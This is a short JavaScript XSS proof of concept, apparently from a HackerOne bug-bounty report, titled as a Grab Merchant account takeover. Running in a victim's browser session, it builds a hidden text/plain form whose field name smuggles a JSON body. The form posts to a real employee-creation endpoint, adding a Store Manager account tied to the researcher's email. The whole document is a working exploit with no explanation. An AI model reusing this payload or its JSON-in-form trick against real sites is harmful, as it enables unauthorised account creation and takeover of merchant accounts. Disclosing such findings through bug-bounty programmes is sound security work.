// XSS to Grab Merchant - Account Takeover

var random = Math.floor(Math.random() * 90000) + 10000;
var username = "newuser_hackerone_" + random;

var form = document.createElement("form");
form.method = "POST";
form.action = "https://merchant.grab.com/employee-management/v1/create-user";
form.enctype = "text/plain";

var input = document.createElement("input");
input.type = "hidden";

input.name = '{"full_name":"ID","role":"Store Manager","correspondence_email":"xchopath@wearehackerone.com","username":"' + username + '","pad":"';
input.value = '"}';

form.appendChild(input);
document.body.appendChild(form);
form.submit();
